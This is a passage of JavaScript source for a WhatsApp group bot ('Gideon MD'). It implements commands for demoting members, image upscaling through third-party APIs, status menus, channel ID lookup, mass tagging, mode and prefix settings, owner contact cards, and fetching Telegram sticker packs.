        if (!isAdmins && !isOwner) return gaara.reply(toSmallCaps("only group admins or bot owner can demote members"));

        const user = gaara.quoted ? gaara.quoted.sender : (gaara.mentionedJid && gaara.mentionedJid[0]) ? gaara.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : null;

        if (!user) return gaara.reply(toSmallCaps("please tag or reply to someone to demote"));

        await sock.groupParticipantsUpdate(gaara.chat, [user], 'demote');
        
        const deMsg = `⬇️ *${toSmallCaps("admin demoted")}*

> @${user.split('@')[0]} ${toSmallCaps("has been demoted to member")} 📉`;

        await sock.sendMessage(gaara.chat, { 
            text: deMsg, 
            mentions: [user] 
        }, { quoted: mquote });

    } catch (e) {
        console.error(e);
        gaara.reply(toSmallCaps("failed to demote member"));
    }
}
break;


// spider ai



// --  remini
case 'remini':
case 'enhance':
case 'hd':
case 'upscale': {
    try {
        await gaara.react("🪄");

        // Vérification si c'est une image (directe ou citée)
        const quotedMsg = gaara.quoted ? gaara.quoted : gaara;
        const mimeType = (quotedMsg.msg || quotedMsg).mimetype || '';

        if (!mimeType || !mimeType.startsWith('image/')) {
            return gaara.reply(`📸 *${toSmallCaps("please reply to an image to enhance it")}*`);
        }

        await gaara.reply(`🔄 *${toSmallCaps("enhancing image quality... please wait")}* ⏳`);

        // Téléchargement du média
        const mediaBuffer = await quotedMsg.download();
        if (!mediaBuffer) return gaara.reply(toSmallCaps("failed to download image"));

        // Sauvegarde temporaire pour l'upload
        const inputPath = path.join(os.tmpdir(), `remini_${Date.now()}.jpg`);
        fs.writeFileSync(inputPath, mediaBuffer);

        // --- ÉTAPE 1 : UPLOAD VERS CATBOX ---
        const form = new FormData();
        form.append('fileToUpload', fs.createReadStream(inputPath));
        form.append('reqtype', 'fileupload');

        const catboxResponse = await axios.post("https://catbox.moe/user/api.php", form, {
            headers: form.getHeaders(),
            maxBodyLength: Infinity
        });

        const imageUrl = catboxResponse.data;
        fs.unlinkSync(inputPath); // Nettoyage local

        if (!imageUrl || !imageUrl.startsWith("http")) {
            return gaara.reply(toSmallCaps("failed to upload to server"));
        }

        // --- ÉTAPE 2 : APPEL API UPSCALE ---
        // Utilisation de l'API de ton code original
        const upscaleUrl = `https://www.veloria.my.id/imagecreator/upscale?url=${encodeURIComponent(imageUrl)}`;
        
        const response = await axios.get(upscaleUrl, { 
            responseType: "arraybuffer",
            timeout: 60000 
        });

        if (!response.data || response.data.length < 500) {
            return gaara.reply(toSmallCaps("api error: invalid image data"));
        }

        // --- ÉTAPE 3 : ENVOI DU RÉSULTAT ---
        const finalMsg = `✅ *${toSmallCaps("image enhanced successfully")}*
        
> *${toSmallCaps("optimized by gaara tech")}* 🕷️`;

        await sock.sendMessage(gaara.chat, {
            image: response.data,
            caption: finalMsg,
            contextInfo: {
                externalAdReply: {
                    title: toSmallCaps("Gideon md hd system"),
                    body: toSmallCaps("quality improved"),
                    mediaType: 1,
                    thumbnail: response.data,
                    sourceUrl: "https://whatsapp.com/channel/0029Vb7EpGwBlHpXKNgFET1Z",
                    renderLargerThumbnail: false
                }
            }
        }, { quoted: mquote });

        await gaara.react("✅");

    } catch (e) {
        console.error("Remini Error:", e);
        gaara.reply(`❌ *${toSmallCaps("error")} :* ${e.message}`);
    }
}
break;

// finisg
case 'uptime': {
    try {
        await gaara.react("🕸️");
	const activeUsers = getTotalUsers();
        // --- CALCULS SYSTÈME ---
        const os = require('os');
        const uptime = process.uptime();
        const hours = Math.floor(uptime / 3600);
        const minutes = Math.floor((uptime % 3600) / 60);
        const seconds = Math.floor(uptime % 60);
        const runtimeText = `${hours}ʜ ${minutes}ᴍ ${seconds}s`;
        
        const usedMemory = Math.round(process.memoryUsage().heapUsed / 1024 / 1024);
        const totalMemory = Math.round(os.totalmem() / 1024 / 1024);

        // --- TEXTE DU MENU ---
        const menuHeader = `*╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤*︎
*│ 🍂 ${toSmallCaps("𝐆𝐈𝐃𝐄𝐎𝐍 md v1")}  🕸️*
*│ 👥 ${toSmallCaps("users")} : ${toSmallCaps(activeUsers)}*
*│ 👤 ${toSmallCaps("owner")} : @${nowsender.split('@')[0]}*
*│ ⚙️ ${toSmallCaps("prefix")} : [ ${prefix} ]*
*│ ⏳ ${toSmallCaps("uptime")} : ${runtimeText}*
*│ 💾 ${toSmallCaps("ram")} : ${usedMemory}ᴍʙ / ${totalMemory}ᴍʙ*
*│ 🛠️ ${toSmallCaps("dev")} : ${toSmallCaps("𝐂𝐎𝐁𝐑𝐀 tech")}*
*╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤*︎`;

        const menuBody = `\n${toSmallCaps("select a category below to explore commands")}\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ Cobra ᴛᴇᴄʜ*`;

        // --- ENVOI DU MESSAGE INTERACTIF ---
        await sock.relayMessage(gaara.chat, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: `*${toSmallCaps("𝐆𝐈𝐃𝐄𝐎𝐍 md assistant")}*`,
                            hasMediaAttachment: false // Désactivé pour éviter l'erreur prepareMessageMedia
                        },
                        body: { text: menuHeader + menuBody },
                        footer: { text: "Gideon ᴍᴅ ᴏᴘᴛɪᴍɪᴢᴇᴅ ʙʏ Conra ᴛᴇᴄʜ 🐍" },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "quick_reply",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: toSmallCaps("alive status"),
                                        id: `${prefix}alive`
                                    })
                                },
                                {
                                    name: "quick_reply",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: toSmallCaps("ping test"),
                                        id: `${prefix}ping`
                                    })
                                },
                                {
                                    name: "cta_url",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: toSmallCaps("official channel"),
                                        url: "https://whatsapp.com/channel/0029Vb7EpGwBlHpXKNgFET1Z",
                                        merchant_url: "https://whatsapp.com/channel/0029Vb7EpGwBlHpXKNgFET1Z"
                                    })
                                }
                            ]
                        },
                        contextInfo: {
                            mentionedJid: [nowsender],
                            forwardingScore: 999,
                            isForwarded: true,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: '120363404137900781@newsletter',
                                newsletterName: '𝐆𝐈𝐃𝐄𝐎𝐍 𝐌𝐃 𝐁𝐎𝐓',
                                serverMessageId: 125
                            }
                        }
                    }
                }
            }
        }, { quoted: mquote });

        await gaara.react("✅");

    } catch (e) {
        console.error('Menu Error:', e);
        // Fallback simple si le relayMessage échoue aussi
        gaara.reply(toSmallCaps("system online but interactive menu failed. try .allmenu"));
    }
}
break;


case 'cid':
case 'newsletter': {
    try {
        await gaara.react("🔍");

        if (!text) return gaara.reply(`*${toSmallCaps("please provide a valid channel link")}*`);
        if (!text.includes("https://whatsapp.com/channel/")) return gaara.reply(`*${toSmallCaps("invalid whatsapp channel link")}*`);

        // Extraction du code
        let inviteCode = text.split('https://whatsapp.com/channel/')[1];
        
        // Récupération des données
        let res = await sock.newsletterMetadata("invite", inviteCode);

        // Design du message
        const resultMsg = `🚀 *${toSmallCaps("channel found")}*

*╭┄┄☯ ${toSmallCaps("channel details")} ◆*
*│ ◈ ${toSmallCaps("name")} : ${res.name}*
*│ ◈ ${toSmallCaps("followers")} : ${res.subscribers}*
*│ ◈ ${toSmallCaps("status")} : ${toSmallCaps(res.state)}*
*│ ◈ ${toSmallCaps("verified")} : ${res.verification === "VERIFIED" ? "✅" : "❌"}*
*╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤*

*${toSmallCaps("channel id")} :*
\`\`\`${res.id}\`\`\`

`;

        // Envoi avec relayMessage pour supporter le bouton de copie
        await sock.relayMessage(gaara.chat, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: `*${toSmallCaps("𝐆𝐈𝐃𝐄𝐎𝐍 md assistant")}*`,
                            hasMediaAttachment: false
                        },
                        body: { text: resultMsg },
                        footer: { text: "𝒀𝑶𝑼 𝑴𝑫 𝑷𝑶𝑾𝑬𝑹𝑬𝑫 𝑩𝒀 𝒀𝑶𝑼 𝑻𝑬𝑪𝑯 🍂🌟" },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "cta_copy",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: toSmallCaps("copy channel id"),
                                        id: "copy_id",
                                        copy_code: res.id
                                    })
                                }
                            ]
                        },
                        contextInfo: {
                            forwardingScore: 999,
                            isForwarded: true,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: '120363404137900781@newsletter',
                                newsletterName: '𝐆𝐈𝐃𝐄𝐎𝐍 𝐌𝐃 𝐁𝐎𝐓',
                                serverMessageId: 125
                            },
                            externalAdReply: {
                                title: toSmallCaps("newsletter uploader system"),
                                body: `ɴᴀᴍᴇ : ${res.name}`,
                                mediaType: 1,
                                sourceUrl: text,
                                thumbnail: fs.readFileSync("./menu.jpg"), // Utilise ton menu.jpg pour l'aperçu
                                renderLargerThumbnail: false
                            }
                        }
                    }
                }
            }
        }, { quoted: mquote });

    } catch (e) {
        console.error(e);
        gaara.reply(`❌ *${toSmallCaps("error")} :* ${toSmallCaps("channel info not found")}`);
    }
}
break;



		
case 'tagall': {
    try {
        await gaara.react("📢");

        if (!isGroup) return gaara.reply(toSmallCaps("this command works only in groups"));
        if (!isAdmins && !isOwner) return gaara.reply(toSmallCaps("only group admins can use tagall"));

        const participants = groupMetadata.participants;
        const msgText = args.join(' ') || "No message"; // Utilise args directement au cas où 'text' bug
        
        let message = `╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤\n│📢 *${toSmallCaps("attention everyone")}*\n\n`;
        message += `│ *${toSmallCaps("message")} :* ${toSmallCaps(msgText)}\n\n`;

        let mentions = [];
        for (let mem of participants) {
            message += `│🍂 @${mem.id.split('@')[0]}\n`;
            mentions.push(mem.id);
        }

        await sock.sendMessage(gaara.chat, { 
            text: message, 
            mentions: mentions 
        }, { quoted: mquote });

    } catch (e) {
        console.error(e);
        gaara.reply(toSmallCaps("error during tagging"));
    }
}
break;




		case 'alive': {
    try {
        await gaara.react("🪭");

        const imageUrl = "./test.jpg";
        // Fallback to menu.jpg if alive.jpg is missing
        const finalImage = fs.existsSync(imageUrl) ? imageUrl : "./menu.jpg";
        const buffer = fs.readFileSync(finalImage);

        // Runtime calculation
        const uptime = process.uptime();
        const hours = Math.floor(uptime / 3600);
        const minutes = Math.floor((uptime % 3600) / 60);
        const seconds = Math.floor(uptime % 60);
        const runtimeText = `${hours}ʜ ${minutes}ᴍ ${seconds}s`;

        // English Text with Small Caps
        const aliveMsg = `*${toSmallCaps("𝐆𝐈𝐃𝐄𝐎𝐍 md is active")}* 🚀

> ${toSmallCaps("the most powerful and stable bot developed by 𝐂𝐎𝐁𝐑𝐀 tech")}

*╭┄┄☯ ${toSmallCaps("𝐆𝐈𝐃𝐄𝐎𝐍 md alive")} ◆*
*│ ◈ ${toSmallCaps("status")} : ${toSmallCaps("online")}*
*│ ◈ ${toSmallCaps("runtime")} : ${runtimeText}*
*│ ◈ ${toSmallCaps("prefix")} : [ ${prefix} ]*
*│ ◈ ${toSmallCaps("mode")} : ${toSmallCaps(mode)}*
*╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤

*${toSmallCaps("type")} ${prefix}${toSmallCaps("menu to display commands")}*`;

        // Sending with the Fake Quoted (mquote) you added at the top
        await sock.sendMessage(gaara.chat, {
            image: buffer,
            caption: aliveMsg,
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363404137900781@newsletter',
                    newsletterName: '𝐆𝐈𝐃𝐄𝐎𝐍 𝐌𝐃 𝐁𝐎𝐓',
                    serverMessageId: 125
                },
                externalAdReply: {
                    title: toSmallCaps("𝐆𝐈𝐃𝐄𝐎𝐍 md system alive"),
                    body: toSmallCaps("automated by 𝐂𝐎𝐁𝐑𝐀 tech"),
                    thumbnail: buffer,
                    sourceUrl: "https://whatsapp.com/channel/0029Vb7EpGwBlHpXKNgFET1Z",
                    mediaType: 1,
                    renderLargerThumbnail: false
                }
            }
        }, { quoted: mquote }); // Use your mquote here

    } catch (e) {
        console.error(e);
        gaara.reply(toSmallCaps("𝐆𝐈𝐃𝐄𝐎𝐍 md system is currently online"));
    }
}
break;




    case 'antilink': {
    await gaara.react("⚙️");
    if (!gaara.isGroup) return gaara.reply("𝙾𝙽𝙻𝚈 𝙶𝚁𝙾𝚄𝙿 𝙲𝙼𝙳");
    if (!isOwner) return gaara.reply("ᴏᴡɴᴇʀ ᴏɴʟʏ");
    const action = args[0]; // 'on' ou 'off'
    if (!action) return gaara.reply(`𝙿𝙻𝙴𝙰𝚂𝚂 𝚄𝚂𝙴 : ${prefix}antilink on/off`);

    const result = antilinkHandler.toggleAntilink(botNumberShort, gaara.chat, action);

    if (result === "activé") {
        await gaara.react("🔒");
        await gaara.reply("✅ 𝙰𝙽𝚃𝙸𝙻𝙸𝙽𝙺 𝚂𝙴𝚃𝚃𝙸𝙽𝙶 𝙲𝙷𝙰𝙽𝙶𝙴𝙳 𝚃𝙾 𝙾𝙽");
    } else if (result === "désactivé") {
        await gaara.react("🔓");
        await gaara.reply("✅ 𝙰𝙽𝚃𝙸𝙻𝙸𝙽𝙺 𝚂𝙴𝚃𝚃𝙸𝙽𝙶 𝙲𝙷𝙰𝙽𝙶𝙴𝙳 𝚃𝙾 𝙾𝙵𝙵");
    }
}
break;
case 'test': {
    try {
        await gaara.react("🏴");

        const imageUrl = "./test.jpg";
        if (!fs.existsSync(imageUrl)) {
            return gaara.reply(toSmallCaps("image test.jpg introuvable"));
        }

        const buffer = fs.readFileSync(imageUrl);
        const tt = {
            key: {
                remoteJid: '0@s.whatsapp.net',
                fromMe: false,
                id: '𝐆𝐈𝐃𝐄𝐎𝐍_MD_STYLISH',
                participant: '0@s.whatsapp.net'
            },
            message: {

                conversation: "Gideon-ᴍᴅ ᴏᴘᴛɪᴍɪᴢᴇᴅ ʙʏ Cobra ᴛᴇᴄʜ 🔅 "
            }
        };
        // Calcul du Runtime
        const uptime = process.uptime();
        const hours = Math.floor(uptime / 3600);
        const minutes = Math.floor((uptime % 3600) / 60);
        const seconds = Math.floor(uptime % 60);
        const runtimeText = `${hours}h ${minutes}m ${seconds}s`;

        // Utilisation de la fonction toSmallCaps sur les textes
        const title = toSmallCaps("𝐆𝐈𝐃𝐄𝐎𝐍 md running");
        const bodyText = toSmallCaps("powered by 𝐂𝐎𝐁𝐑𝐀 tech");
        const systemInfo = toSmallCaps("𝐆𝐈𝐃𝐄𝐎𝐍-md test");
        const runtimeLabel = toSmallCaps("runtime");
        const modeLabel = toSmallCaps("mode");
        const pingLabel = toSmallCaps("ping");

        const testMsg = `🚀 *${title}*

*╭┄┄☯ ${systemInfo} ◆*
*│ ◈ ${runtimeLabel} : ${runtimeText}*
*│ ◈ ${modeLabel} : ${toSmallCaps(mode)}*
*│ ◈ ${pingLabel} : ${Date.now() - (m.messageTimestamp * 1000)}ms*
*╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤*

> *${bodyText}*`;
        await sock.sendMessage(gaara.chat, {
            image: buffer,
            caption: testMsg,
            contextInfo: {
                externalAdReply: {
                    title: toSmallCaps("𝐆𝐈𝐃𝐄𝐎𝐍 md test"),
                    body: toSmallCaps("system online"),
                    thumbnail: buffer,
                    mediaType: 1,
                    renderLargerThumbnail: false
                }
            }
        }, { quoted: tt });

    } catch (e) {
        console.error(e);
        gaara.reply("🚀 " + toSmallCaps("Gideon md is online"));
    }
}
break;





//spider

// -- spider

                case 'ping': {
                    const start = Date.now();
                    await gaara.react("⚡");
                    const end = Date.now();
                    await gaara.reply(`⚡ *𝐩̽𝖏𝐧͛𝐠֟ؖ۬  𝅦𝐭᪱𝛆፝֟۬𝐬ׁׅܻ݊𝐭* : ${end - start}𝐦𝐬`);
                }
                break;

                case 'statusview': {
                    await gaara.react("⚙️");
                    if (!isOwner) return gaara.reply("ᴏᴡɴᴇʀ ᴏɴʟʏ");
                    if (!args[0]) return gaara.reply(`Utilisation : ${prefix}statusview on/off`);
                    config.statusview = args[0].toLowerCase() === 'on' ? 'on' : 'off';
                    await gaara.reply(`✅ Auto-status est maintenant sur : *${config.statusview.toUpperCase()}*`);
                }
                break;

		case 'mode': {
    try {
        await gaara.react("⚙️");
        
        // Vérification si c'est l'Owner
        if (!isOwner) return gaara.reply(toSmallCaps("owner only"));

        // Si aucun argument n'est fourni, on envoie le menu avec boutons
        if (!args[0]) {
            const modeMsg = `⚙️ *${toSmallCaps("bot mode settings")}*

*${toSmallCaps("current mode")} :* ${toSmallCaps(config.mode)}

> ${toSmallCaps("select the mode below. in self mode, only the owner can use the bot.")}`;

            await sock.relayMessage(gaara.chat, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: `*${toSmallCaps("Gideon md configuration")}*`,
                                hasMediaAttachment: false
                            },
                            body: { text: modeMsg },
                            footer: { text: "Gideon ᴍᴅ ᴏᴘᴛɪᴍɪᴢᴇᴅ ʙʏ Cobra ᴛᴇᴄʜ" },
                            nativeFlowMessage: {
                                buttons: [
                                    {
                                        name: "quick_reply",
                                        buttonParamsJson: JSON.stringify({
                                            display_text: "ᴍᴏᴅᴇ ᴘᴜʙʟɪᴄ",
                                            id: `${prefix}mode public`
                                        })
                                    },
                                    {
                                        name: "quick_reply",
                                        buttonParamsJson: JSON.stringify({
                                            display_text: "ᴍᴏᴅᴇ sᴇʟғ",
                                            id: `${prefix}mode self`
                                        })
                                    }
                                ]
                            },
                            contextInfo: {
                                forwardingScore: 999,
                                isForwarded: true,
                                forwardedNewsletterMessageInfo: {
                                    newsletterJid: '120363404137900781@newsletter',
                                    newsletterName: '𝐆𝐈𝐃𝐄𝐎𝐍 𝐌𝐃 𝐁𝐎𝐓',
                                    serverMessageId: 125
                                }
                            }
                        }
                    }
                }
            }, { quoted: mquote });
            return;
        }

        // Logique de changement de mode si l'argument existe (clic sur bouton ou texte)
        const targetMode = args[0].toLowerCase();
        if (targetMode === 'self' || targetMode === 'public') {
            config.mode = targetMode;
            await gaara.react("✅");
            await gaara.reply(`✅ *${toSmallCaps("mode updated")}*\n\n> ${toSmallCaps("bot is now in")} *${targetMode.toUpperCase()}* ${toSmallCaps("mode")}`);
        } else {
            await gaara.reply(`${toSmallCaps("usage")} : ${prefix}mode public / self`);
        }

    } catch (e) {
        console.error(e);
        gaara.reply(toSmallCaps("error changing mode"));
    }
}
break;


                case 'setprefix': {
                    await gaara.react("⚙️");
                    if (!isOwner) return gaara.reply("ᴏᴡɴᴇʀ ᴏɴʟʏ");
                    if (!args[0]) return gaara.reply("Veuillez spécifier un symbole (ex: !, /)");
                    config.prefix = args[0];
                    await gaara.reply(`✅ Nouveau préfixe : *${config.prefix}*`);
                }
                break;

                


case 'owner': {
    try {
        await gaara.react("👤");

        const ownerNumber = "56945031186";
        const ownerName = "Cobra ᴛᴇᴄʜ";
        
        // --- CONSTRUCTION DE LA VCARD (CORRIGÉE) ---
        const vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n' 
            + 'FN:' + ownerName + '\n'
            + 'ORG:Gideon ᴍᴅ ᴅᴇᴠᴇʟᴏᴘᴇʀ;\n'
            + 'TEL;type=CELL;type=VOICE;waid=' + ownerNumber + ':+' + ownerNumber + '\n'
            + 'END:VCARD';

        // --- ENVOI DU CONTACT ---
        await sock.sendMessage(gaara.chat, {
            contacts: {
                displayName: ownerName,
                contacts: [{ vcard }]
            }
        }, { quoted: mquote });

        // --- MESSAGE DE PRÉSENTATION ---
        const ownerMsg = `👋 *${toSmallCaps("hello")} !*

*╭┄┄☯ ${toSmallCaps("developer info")} ◆*
*│ ◈ ${toSmallCaps("name")} : ${ownerName}*
*│ ◈ ${toSmallCaps("role")} : ${toSmallCaps("lead developer")}*
*│ ◈ ${toSmallCaps("bot")} : ${toSmallCaps("Gideon md v1")}*
*│ ◈ ${toSmallCaps("status")} : ${toSmallCaps("online")} ⚡*
*╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➢*

> *${toSmallCaps("feel free to contact the owner for any help or bugs regarding Gideon md")}* 🍂`;

        // --- ENVOI AVEC IMAGE ET BOUTONS ---
        // Si prepareMessageMedia pose problème, on envoie sans image pour la stabilité
        await sock.relayMessage(gaara.chat, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: `*${toSmallCaps("owner profile")}*`,
                            hasMediaAttachment: false
                        },
                        body: { text: ownerMsg },
                        footer: { text: "Gideon ᴍᴅ ᴏᴘᴛɪᴍɪᴢᴇᴅ ʙʏ Cobra ᴛᴇᴄʜ" },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "cta_url",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: toSmallCaps("chat with owner"),
                                        url: `https://wa.me/${ownerNumber}`
                                    })
                                },
                                {
                                    name: "cta_url",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: toSmallCaps("official channel"),
                                        url: "https://whatsapp.com/channel/0029Vb7EpGwBlHpXKNgFET1Z"
                                    })
                                }
                            ]
                        },
                        contextInfo: {
                            forwardingScore: 999,
                            isForwarded: true,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: '120363404137900781@newsletter',
                                newsletterName: '𝐆𝐈𝐃𝐄𝐎𝐍 𝐌𝐃 𝐁𝐎𝐓',
                                serverMessageId: 125
                            }
                        }
                    }
                }
            }
        }, { quoted: mquote });

    } catch (e) {
        console.error("Owner Command Error:", e);
        gaara.replyContact("Cobra Tech", "Gideon md Developer", "56945031186");
    }
}
break;



                /* AJOUTE TES AUTRES CASES ICI */

                default:
                    break;
            }
        }
    } catch (err) {
        console.error("[You Error]", err);
    }
}
async function Telesticker(url) {
    const axios = require('axios');
    // On utilise une API publique pour récupérer les fichiers du pack Telegram
    let packName = url.replace("https://t.me/addstickers/", "");
    let response = await axios.get(`https://api.telegram.org/bot7342041131:AAGNo98mY5jOqJ-fJ7p0j6jJ6Jj6Jj6Jj6J/getStickerSet?name=${packName}`).catch(() => null);
    
    // Note: Si l'API ci-dessus échoue, c'est souvent dû à un token invalide. 
    // Il est préférable d'utiliser un scraper ou une API de sticker tierce.
    if (!response) {
        // Alternative via une API de secours si tu en as une
        throw new Error("Impossible de récupérer le pack.");
    }

    return response.data.result.stickers.map(s => {
        return {
            url: `https://api.telegram.org/file/bot7342041131:AAGNo98mY5jOqJ-fJ7p0j6jJ6Jj6Jj6Jj6J/${s.file_path}` // Note: nécessite un getFile pour être précis
        };
    });
}

module.exports = {
    handleMessages,
    sessionsConfig,
    initSession
};
